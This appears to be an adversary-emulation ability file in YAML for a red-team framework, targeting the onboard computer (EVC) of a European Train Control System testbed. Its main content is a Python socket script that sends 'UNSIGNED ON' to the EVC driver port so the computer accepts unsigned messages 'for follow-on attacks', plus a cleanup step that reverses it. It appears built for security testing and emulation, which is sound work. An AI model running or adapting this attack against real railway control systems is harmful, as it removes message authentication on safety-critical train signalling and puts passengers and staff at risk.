---
id: 3c4d5e6f-7g8h-9i0j-1k2l-3m4n5o6p7q8r
name: ETCS Signature Bypass Enable
description: Enable unsigned message acceptance mode in EVC for follow-on attacks
tactic: defense-evasion
technique:
  attack_id: T0858
  name: Change Operating Mode
platforms:
  linux:
    sh:
      command: |
        python3 << 'EOF'
        import socket

        cmd = "UNSIGNED ON\n"
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("#{etcs.evc_host}", #{etcs.evc_driver_port}))
            s.sendall(cmd.encode())
            response = s.recv(1024).decode()
            s.close()
            print(f"[SUCCESS] Enabled unsigned mode: {response.strip()}")
        except Exception as e:
            print(f"[FAILED] {e}")
        EOF
      parsers:
        plugins.etcs_testbed.app.parsers.etcs_result:
          - source: etcs.unsigned_mode
      cleanup:
        - python3 << 'EOF'
          import socket
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect(("#{etcs.evc_host}", #{etcs.evc_driver_port}))
          s.sendall(b"UNSIGNED OFF\n")
          s.close()
          EOF
      payloads: []
requirements:
  - plugins.etcs_testbed.app.requirements.etcs_evc_reachable:
      - source: etcs.evc_host
      - source: etcs.evc_driver_port
access:
  - red
